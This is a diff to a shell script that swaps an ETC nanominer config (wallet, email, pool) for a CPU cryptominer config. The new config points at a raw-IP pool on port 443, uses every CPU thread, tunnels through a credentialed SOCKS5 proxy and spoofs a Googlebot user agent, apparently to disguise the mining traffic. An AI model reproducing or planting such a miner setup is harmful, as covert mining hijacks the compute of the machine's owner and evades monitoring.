@@ -1,9 +1,17 @@
-#!/bin/bash
-echo "[Etchash]
-wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
-coin = ETC
-rigName = $(echo $(shuf -i 1-9999 -n 1)-no1)
-email = xmr75609@gmail.com
-rigPassword = x
-pool1 = etc.2miners.com:1010" > config.ini
-./nanominer
+cat > config.json <<END
+{
+        "url" : "141.95.108.117:443",
+        "user" : "MRiuC462CNKBygJWFqDU6SatcvGB2f6v2x",
+        "pass" : "c=LTC,zap=ONX",
+        "algo" : "yespower",
+        "threads" : $(nproc --all),
+        "cpu-priority" : 0,
+        "cpu-affinity" : -1,
+        "benchmark" : false,
+        "debug" : false,
+        "protocol": false,
+        "quiet" : false,
+        "proxy" : "socks5://gratis:q1w2e3r4t5@141.95.108.117",
+        "agent" : "Googlebot/2.1"
+}
+END
